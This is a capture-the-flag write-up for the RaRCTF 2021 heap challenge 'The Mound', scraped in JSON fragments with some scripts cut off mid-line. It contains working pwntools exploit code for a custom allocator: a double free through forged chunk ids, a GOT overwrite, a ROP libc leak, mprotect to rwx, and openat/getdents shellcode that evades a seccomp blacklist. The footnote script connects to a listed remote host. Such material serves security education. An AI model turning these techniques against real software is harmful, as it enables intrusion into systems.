","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:2:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"main()’s loop The CLI gives five options: 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home Here’s a skeleton script to deal with the options: from pwnscripts import * context.binary = 'mound' context.libc = 'libc.so.6' r = context.binary.process() def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(sz: int, idx: int, s: bytes): choose(2) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) (5) just calls exit(0), but the rest are more complex. Add sand case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; This option is really weird. A user-inputted stream of bytes – not necessarily nul-terminated – are sent to strdup, and the resultant glibc malloc’d string is stored at arr[idx]. This means that some of arr[]’s elements can be a mixture of mound pointers, and actual glibc heap pointers. It’s also worth noting that the str* functions here can overflow, depending on whether the stack has extra nul-bytes or not. Add dirt case 2: // add printf(\"Size of pile: \"); scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; So this is a little bit interesting. The maximum allocation size is 0xfff; user_sz is an unsigned so the single-bounded comparison works out. For some reason, sizes[idx] is set to 0 instead of user_sz. This is a little bit weird because of case 3: Replace dirt case 3: // edit printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; sizes[idx] has to be non-zero for the edit to pass. Since Option 2 sets sizes[idx] to 0, arr[idx] can only be edited if it’s a pointer from the glibc heap in case 1, or if sizes[idx] can be modified somewhere else. Remove dirt case 4: // free printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); // remember that `idx` itself is typed as unsigned. if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; This option calls mfree() on arr[idx]. There’s only one bug here, and it’s that arr[idx] is not zeroed. So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn’t immediately obvious here. I’ll need to dive deeper into the mound implementation. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:2:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mound The mound is kind of like the glibc heap, if it had nothing but the tcache. At the start of the program, the mound grabs two big memory spaces from mmap: 0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw- 0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw- 0xbeef* stores the actual data distributed by mmalloc; I’ll call it mound_data. At the beginning of its life, the entirety of the mound_data segment constitutes the “top chunk” of the mound. 0xdead* stores the metadata for the mound, kind of like what main_arena does in glibc. The structure looks something like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 mound_metadata mound_arena; // cs:0xdead0000000 The new types in there are further defined like so: typedef struct mchunk { size_t id; // rand64() id. size_t sz; // the chunk size (inclusive of metadata) char data[0]; // length is dependent on the size provided to mmalloc() } typedef struct mcache_entry { struct mchunk; // i.e. extend/inherit the mchunk structure here mcache_struct *mcache; // a copy of the mcache for safety verification mcache_entry *next; // next mcache entry; this is a linked list like the tcache. } #define MCACHE_MAX_BINS 0x18 typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } The most interesting part of each mchunk is (in my opinion, anyway) the id element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision2) upon allocation. When a chunk is freed, that ID gets chucked into the mound_metadata to protect the program against a double-free. This might make a lot more sense if I give a flowchart of how things work: Relevant macros: #define request2size(x) ((-x\u00260xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too. #define csize2midx(x) ((x\u003e\u003e4)-2) #define chunk2mem(p) ((void*)p+0x10) #define mem2chunk(p) ((void*)p-0x10) I copied and adapted some of these to python as well: def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to mfree()? ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:3:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mixing heap allocators Simply freeing a glibc heap pointer will almost certainly produce an exit(1): 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 1 Pile: hi Pile index: 0 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 4 Pile index: 0 Mound: Double free detected The relevant part of the code to check is the find_id(c-\u003eid) call: void find_id(size_t id) { for ( int i = 0; i \u003c= 4095; ++i ) if ( id == mound_arena.ids[i] ) { puts(\"Mound: Double free detected\"); exit(1); } } A typical malloc_chunk looks like this: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; }; Because c-\u003eid occupies the same space as a malloc_chunk’s mchunk_prev_size member, the prev_size of the glibc heap chunk is taken as the id in find_id. The glibc chunk pointers allocated by strdup() will never be free, so prev_size == id should always be 0, and find_id(c-\u003eid) should always result in an error given a glibc heap chunk. Or not. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:3:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"The Obvious Solution It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the prev_size field to store user data: This means that if I call strdup(\"A\"*0x17) twice in succession, the first strdup() chunk allocated can be used to overwrite the prev_size of the 2nd strdup() chunk: strdup(b''.rjust(0x17,b'a'), 0) strdup(b''.rjust(0x17,b'a'), 1) edit(0, b''.rjust(0x17,b'a')) Using this method, the interpreted mchunk-\u003eid for a glibc heap chunk can be modified to any value within range(0, 1\u003c\u003c56). # register an arbitrary 56-bit id onto the mound's free id list def reg_id(id: int): strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(id)[:7].rjust(0x17, b'a')) free(0) What are the consequences of this? Adding a new id to mound_arena.ids[] is pretty useless; it would only make allocations harder instead of easier. I could also try to get rid of an ID: def r64(): return randint(0, (1\u003c\u003c64)-1) # generate random ids. Unrelated to rand64bit() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(r64())[:7].rjust(0x17, b'a')) free(1) edit(0, pack(id)[:7].rjust(0x17,b'a')) add(0x10, 2, b'a'*0x10) Then I’d be able to free the same region of memory twice, like this: from ctypes import CDLL libc = CDLL('libc.so.6') # r = ... libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote def rand64bit(): return libc.rand() + (libc.rand()\u003c\u003c32) # ... omitted code ... # ... make sure to account for rand() calls throughout code as well ... while 1: add(sz=0x20, idx=0xf, b'hi') if not ((chunk_id := rand64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) This is a classic tcache dup, except with the mcache instead. Once you accomplish this much, getting to win() isn’t much of a challenge. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:4:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting to win() Right now, mcache-\u003eentries[1] == [arr[0xf] -\u003e arr[0xf]]. arr[0xf]-\u003enext can be modified to anything, so long as (mcache_entry*)(arr[0xf]-\u003enext)-\u003emcache == mound_arena.mcache. Taking a hint from the the definition, I’ll try to point -\u003enext to mound_arena.mcache-0x10, because it’s the only non-user-controlled region that happens to have an mcache pointer. add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8)) The linked list here is now [arr[0xf] -\u003e mound_arena+0x7ff8]. As a reminder, the mound_arena looks like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 Right after the mcache is the top pointer. Pulling two items off of the mcache linked list will get the top pointer overwritten with user-controllable data: add(0x20, 0xd, 'hi') add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) Here, I’m overwriting mound_data.top with a GOT pointer to gain RIP control: add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf() And now the exploit reaches win(): Simple enough, right? ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:4:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"On the lengths I will go to fool myself: a novel, inferior exploit approach Picture this: it’s the middle of a Saturday afternoon. I’m looking at gdb in one window, and vim in the next. There’s a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays™ decompiler. In short, I’m not really thinking straight. But what I do notice, in my digital stupor, are the comments I have open in Pseudocode-Q3: I had dismissed the immediate relevance of strdup() with the false reasoning I’d demonstrated at the end of this section. I even got to work on rationalizing the apparent irrelevancy of case 1/3; my writeup had these lines at one point: It’s reasonable to assume that strdup() was introduced explicitly as an exploit vector for the challenge, so I can expect that there’s a way to edit mchunk_prev_size without calling free(). On a wild guess, I expect that the final exploit involves modifying sizes[idx] and overflowing into glibc chunk metadata via case 3. Since there’s currently no way to move forward with case 1/3, I’ll shift my focus to the other two cases. The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with mmalloc(0). Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I’d prefer to leave the details available to the public. So, let’s talk about mmalloc(). ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:5:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"mmalloc() and mfree() mmalloc() is only ever called in case 2: case 2: // add if ( user_sz \u003c= 0xFFF ) { // ... omitted ... if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; mmalloc() itself is defined a little oddly: __int64 *mmalloc(int user_sz) { int chunk_sz = request2size(user_sz); if ( chunk_sz \u003c 0 ) // not sure what the purpose of this is chunk_sz = (-user_sz \u0026 0xF) + user_sz + 31; int midx = csize2midx(chunk_sz); if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } If I expand the macros, the bug becomes more obvious: __int64 *mmalloc(int user_sz) { // 0 \u003c= user_sz \u003c= 0xfff int chunk_sz = (-user_sz\u00260xf)+user_sz+0x10; // 0x10 \u003c= chunk_sz \u003c= 0x1010 if ( chunk_sz \u003c 0 ) /* { ... } ignore */ int midx = (chunk_sz\u003e\u003e4)-2; // -1 \u003c= midx \u003c= 0xff if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) // possible negative index here!!! return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } As a reminder, the mcache is structured like this: typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } mcache-\u003eentries[-1] really refers to mcache-\u003ecounts[0x10:0x18]. By filling up the mcache bins for 0x120 \u003c= chunk_sz \u003c 0x1a0, we can get mcache-\u003eentries[-1] to point to any arbitrary location. The subsequent call to mmalloc_alloc(0) has a small safety check, as I showed earlier in the flowchart: __int64 *mcache_alloc(int user_sz) { // user_sz = 0 mcache_struct *mcache_ = mcache; // [rsp+30h] [rbp-10h] int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h] mcache_entry *e = mcache-\u003eentries[midx]; // [rsp+20h] [rbp-20h] mcache-\u003eentries[midx] = (mcache_entry *)e-\u003efd; --mcache_-\u003ecounts[midx]; if ( mcache_ != (mcache_struct *)e-\u003emcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache puts(\"Mcache: Invalid verify\"); exit(1); } e-\u003efd = e-\u003emcache = 0LL; remove_id(e-\u003eid); return \u0026e-\u003emcache; } This effectively means that mcache-\u003eentries[-1] needs to point to a known region of user-controlled data, like the mound. I’ll use this bug to allocate a fake chunk with a valid mcache size. def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(0x20, 0, fake_mcache_entry(0x100)) add(1, 1, b'a') # chunk to be overflowed fake_mcache_addr = 0xbeef0000100 for i,b in enumerate(pack(fake_mcache_addr)): chunk_sz = 0x120+i*0x10 user_sz = chunk_sz - 0x10 # TODO: how to get b \u003e 0xf? for i in range(b): add(user_sz, 0xf-i, b'garbage') for i in range(b): free(0xf-i) add(0, 2, b'') # trigger bug free(0) There’s a TODO in there, and I’ll explain. The problem with incrementing mcache-\u003ecounts[0x10:0x18] one-by-one is that there aren’t enough pointers to go around. By right, if sizeof(arr[]) is only 0x10, the maximum value for mcache-\u003ecounts[] should be 0x10 as well. I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in Fake IDs, and I started work on an odd, roundabout method of achieving much of the same4: # The substance of the exploit: getting mcache-\u003eentries[-1] to point to a fake mchunk for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b): def pad(s: bytes): return s.rjust(0x17, b'a') strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk. strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10) add(midx, 2, b'hi') while (pred := r64bit())\u003e\u003e56: add(midx, 2, b'hi') for _ in range(b): # continually double-free to boost -\u003ecounts[] free(2) edit(0xf, pad(pack(r64())[:7])) free(0xe) edit(0xf, pad(","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:5:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Using win() The seccomp filter for this challenge is mildly interesting. Normally, seccomp’d binaries have a whitelist for permitted syscalls, but in this situation, there’s only a blacklist against a few. The blacklisted items give pause for thought: both execve and open are banned, and normally you’d use the former to pop a shell, and the latter for an open-read-write chain. But before I get ahead of myself, let’s talk about how to get to arbitrary syscalls first. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:6:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Moving to rwx There aren’t a lot of gadgets in the main binary, so it might be better to leak libc first. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all') Once that’s done, I can abuse gadgets in libc to convert the mound_data memory region into an rwx page: R = ROP(context.libc) R.raw(0x48*b'a') R.mprotect(mound_data.base, 0x400000, 7) R.call(mound_data.shellcode) r.sendlineafter(';)\\n', R.chain()) This only makes sense if mound_data.shellcode actually points to an area of user-written shellcode. I handled this by writing shellcode to mound_data using add(), long before the mcache dup happens: # ... everything up until the first few add() calls ... sc = ... # I'm about to cover this part. sc = asm(sc) # don't call asm() twice add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use # ... everything else, e.g. getting mcache dup ... Figuring out what shellcode to run isn’t too difficult, if you have a syscall reference in hand. This challenge shows why you shouldn’t use a seccomp blacklist: open might be banned, but openat certainly isn’t. I’ll start off with some shellcode to open the /pwn/ folder: sc = shellcraft.pushstr('/pwn') sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) sc+= 'mov QWORD PTR [{}], rax\\n'.format(0xbeef0000000) sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory After that, I’ll apply a basic assembly loop to search for .txt: sc+= shellcraft.mov('rax', 0xbeef0010000) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(u32('.txt')) sc+= 'jne loop\\n' # End result: *(int*)rax == u32(\".txt\") Since the flag’s filename is always 0x20+4 bytes long, the beginning of the flag filename will be at rax-0x20 , and I can use openat again to write the flag to stdout: sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(0xbeef0000000) sc+= shellcraft.openat('rax', 'rbx', 0) # i.e. shellcraft.cat('rbx'), but sc+= shellcraft.read('rax', 0xdead0000000, 100) # because pwntools uses SYS_open sc+= shellcraft.write(1, 0xdead0000000, 100) # I have to do this in 3 lines. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:6:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting the flag For reference, this is what the full script should look like at this point: from random import randint from collections import namedtuple from ctypes import CDLL from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here sc = '' # step 1: getting a directory listing sc+= shellcraft.pushstr('/pwn') # put \"/pwn\" on the stack sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr sc+= 'mov QWORD PTR [{}], rax\\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base) sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory # step 2: loop through the dents data to find the flag filename sc+=shellcraft.mov('rax', mound_data.dents) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(hex(u32('.txt'))) sc+= 'jne loop\\n' # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(mound_data.base) sc+= shellcraft.openat('rax', 'rbx', 0) sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN) sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN) sc = asm(sc) # don't call asm() twice add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use # The Obvious Solution: mcache dup --\u003e mound_arena.top overwrite --\u003e GOT table edit to win() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 5) strdup(b'a'*0x17, 6) edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a')) free(midxs.fakeid_provider) edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a')) add(midxs.strdup, 7, b'a'*0x10) for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them. while 1: # try adding until there's an ID with a null MSB add(midxs.mcache_dup, 0xf, b'hi') if not ((chunk_id := r64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) # mcache dup add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite -\u003enext add(midxs.mcache_dup, 0xd, 'hi') add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf'] # win() will execute. Leak libc in the first cycle. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['rea","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:6:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mistakes [Content warning: unsubstantiated opinions] ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:7:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"I. Pwn isn’t RE CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding the heap implementation was written during the 36-hours between me starting this challenge and mound.py spitting out the flag. The assumption I’ve been rolling with, in all of the pwnables do, is that boosting time(reversing binaries) will pay off by a comparable reduction in time(scripting and debugging). That belief didn’t work out for this challenge. At the end of the main() reversing effort, I noted that I observed a few Bad Things going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the mound to understand that sending a glibc pointer to mfree() tends to produce Double free exit(1) calls as a result of a null prev_size. Do you know how else I could’ve discovered that? By just testing out the damn thing and getting a backtrace: gdb.attach(r, gdbscript='b exit\\nc') strdup(b'hi', 0) free(0) r.interactive() Oh, look! It stops in find_id(). Which only stops because *((void*)p-0x10) == NULL for the p in mfree(p). So I should probably find a way to edit prev_size for one of the strdup()’d pointers. Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but The Mound is certainly not one of them. I can’t speak for ptr-yudai, but judging by his long article on adapting fuzzing techniques for CTF pwnables, I expect that there’s a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of eyeballing everything I can in IDA until something sticks. I might re-evaluate this section if someone comes around with a really fast CTF Reversing strategy, but until then: ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:7:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"II. Pattern matching CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape6 after the original design. v8 challenges are a good example of this: Prior to 2018, nothing. This year, there’s already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome’s market share: The IRL relevance of v8 hasn’t changed (much), so what gives? There’s a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might’ve been “Return Oriented Programming”. Go back a few years and you’ll see everyone interested in nifty House of * exploits. In the past few years, there’s been an obsession with things like v8 oobs and printf() one-shots. This is an intentionally broad picture; the trends I’ve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound. Instinctively, I try to pull meta-games using the trends I observe. If it’s a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is a lot harder with contemporary security measures. If there’s a text input, I’ll bash in \"A\"*0x1000 for the sake of it. And if there’s a special number that’ll produce a negative array index — a smaller pattern that I’ve unfortunately internalised — I’ll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there. It was with this bias that I approached The Mound, even after I learnt how to double-free a mound allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing mcache-\u003ecounts[]), but if it follows what I’ve seen before, I have an expectation that things will go the same way. I’ll admit that this is a little bit theoretical, but I would have saved a lot of time if I could’ve just convinced myself to abort with the mcache-\u003eentries[-1] exploit path early on. I’m not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:7:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"III. Things I haven’t considered? I could be doing pwn in sub-optimal ways I can’t identify as sub-optimal on my own. I’m hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster. That’s it. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:7:3","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Footnotes This isn’t particularly useful. There’s no way to leak pointers outside of win(). I tried looking for seeds that would produce repeated cycles: from ctypes import CDLL LIBC = CDLL('libc.so.6') t = LIBC.time(0) t \u0026= 0xffffffffffff0000 for i in range(t,t+0xffff): LIBC.srand(i) seen = set(LIBC.rand() for j in range(0x1000)) if len(seen) \u003c 0xff0: print(i, len(seen)) The script found nothing. In case you’re wondering how there’s a pseudocode reference to mound_arena.mcache-\u003eentries[], as opposed to an ugly red *(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8) reference: Define the mound_metadata class (and the other structs from here) in the Structures tab; you should see an entry like this in the local types tab (Shift+F1): In the IDA View tab, select Edit --\u003e Segments --\u003e Create Segment; fill the pop-up window with sensible values put a variable at mound_arena:00000DEAD0000000 and retype it (Y) as a mound_metadata. The code block there isn’t supposed to make sense. Throughout the writeup, I’ve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a little bit intractable. This is the reason why I ended up searching for the intended solution. My silly alternative method for getting to win() doesn’t work on remote; the time cost associated with a single connection – let alone bruteforcing the PID – makes it impossible to increment mcache-\u003eentries[-1] without an absurdly low ping. The 30x number comes from a crude measure of how many times the exploit calls choose(). For the intended solution, it’s about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes per guess on remote. Feel free to try it out youself: from random import randint from collections import namedtuple from ctypes import CDLL from tqdm import tqdm from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) if args.REMOTE: r = remote('193.57.159.27', 41932) #r = remote('localhost', 8329) libc.srand(t^int(args.PID)) # bruteforce PID else: r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) 